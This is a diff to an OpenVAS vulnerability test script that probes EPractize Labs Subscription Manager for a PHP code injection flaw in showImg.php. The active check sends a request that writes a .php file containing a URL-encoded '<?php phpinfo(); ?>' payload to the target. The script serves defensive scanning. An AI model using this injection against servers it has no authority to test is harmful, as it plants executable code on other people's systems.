@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_EPractize_Subscription_Manager_50919.nasl 11355 2018-09-12 10:32:04Z asteins $
+# $Id: gb_EPractize_Subscription_Manager_50919.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # EPractize Labs Subscription Manager 'showImg.php' PHP Code Injection Vulnerability
 #
@@ -25,18 +25,18 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103401");
   script_bugtraq_id(50919);
-  script_version("$Revision: 11355 $");
+  script_version("$Revision: 11435 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_name("EPractize Labs Subscription Manager 'showImg.php' PHP Code Injection Vulnerability");
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50919");
   script_xref(name:"URL", value:"http://www.epractizelabs.com/email-marketing/subscription-manager.html");
   script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/current/0118.html");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-12 12:32:04 +0200 (Wed, 12 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-01-26 12:49:25 +0100 (Thu, 26 Jan 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -63,11 +63,12 @@ release, disable respective features, remove the product or replace the product 
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
 
-file = "openvas-" + rand() + ".php";
+vtstring = get_vt_string( lowercase:TRUE );
 
 foreach dir( make_list_unique( "/Subscribe", "/subscribe", cgi_dirs( port:port ) ) ) {
 
@@ -76,6 +77,8 @@ foreach dir( make_list_unique( "/Subscribe", "/subscribe", cgi_dirs( port:port )
   buf = http_get_cache( item:url, port:port );
 
   if( "<title> Mailing List" >< buf && "eplform" >< buf ) {
+
+    file = vtstring + "-" + rand() + ".php";
 
     url = dir + "/showImg.php?db=" + file + "&email=%3C?php%20phpinfo();%20?%3E";
     req = http_get( item:url, port:port );
